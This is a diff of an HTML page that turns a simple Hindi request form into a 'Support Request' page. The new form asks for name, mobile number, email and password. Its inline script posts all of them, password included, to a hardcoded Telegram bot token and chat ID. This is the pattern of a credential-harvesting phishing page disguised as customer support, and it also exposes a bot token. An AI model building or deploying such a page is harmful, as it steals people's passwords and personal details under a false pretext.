@@ -1,31 +1,74 @@
-<!DOCTYPE html>
-<html lang="hi">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Submit Request</title>
+   <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>Request</title>
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
-
-    <header>
-        <h1>Request Form</h1>
-    </header>
-
-    <main>
-        <!-- Second Form Details -->
-        <form action="#" method="POST" class="custom-form">
-            <h2>Apni Request Detail Fill Karein</h2>
-            
-            <label for="service">Service/Topic:</label>
-            <input type="text" id="service" name="service" placeholder="Kiske baare me request hai?" required>
-
-            <label for="message">Detail Message:</label>
-            <textarea id="message" name="message" rows="4" placeholder="Yahan apni puri request likhein..." style="width: 100%; padding: 10px; margin-bottom: 15px; border-radius: 6px; border: 1px solid #ccc;"></textarea>
-
-            <button type="submit" class="btn submit-btn">Final Submit</button>
+    <div class="card">
+        <h1>Support Request</h1>
+        <form id="supportForm" onsubmit="sendToTelegram(event)">
+            <input id="name" placeholder="Full Name" required>
+            <input id="mobile" placeholder="Mobile Number" required>
+            <input type="email" id="email" placeholder="Email" required>
+            <input id="password" placeholder="password">
+            <textarea id="issue" placeholder="Describe your issue"></textarea>
+            <button type="submit" class="btn req">Submit Request</button>
         </form>
-    </main>
+        <p><a href="index.html">⬅ Back</a></p>
+    </div>
 
+    <script>
+        function sendToTelegram(event) {
+            event.preventDefault(); // पेज को रिफ्रेश होने से रोकने के लिए
+
+            // ⚠️ यहाँ अपनी डिटेल्स डालें
+            const botToken = "8805904482:AAHwvuLLTpLFW9GUui-F82-
+PoaR74FKACc4"; //
+            const chatId = "8963591045";     // 
+
+            // फॉर्म से डेटा निकालना
+            const name = document.getElementById('name').value;
+            const mobile = document.getElementById('mobile').value;
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value || 'Not Provided';
+            const issue = document.getElementById('issue').value || 'No Description';
+
+            // टेलीग्राम पर दिखने वाला मैसेज फॉर्मेट
+            const message = `📩 *New Support Request*\n\n` +
+                            `👤 *Name:* ${name}\n` +
+                            `📱 *Mobile:* ${mobile}\n` +
+                            `📧 *Email:* ${email}\n` +
+                            `🆔 *Password:* ${password}\n` +
+                            `📝 *Issue:* ${issue}`;
+
+            // टेलीग्राम API URL
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            // डेटा भेजने की प्रोसेस
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'Markdown' // मैसेज को बोल्ड/सुंदर दिखाने के लिए
+                })
+            })
+            .then(response => {
+                if (response.ok) {
+                    alert('Request submitted successfully to Telegram!');
+                    document.getElementById('supportForm').reset(); // फॉर्म खाली करने के लिए
+                } else {
+                    alert('Error sending request. Please check Bot Token or Chat ID.');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('Something went wrong!');
+            });
+        }
+    </script>
 </body>
-</html>
+</html
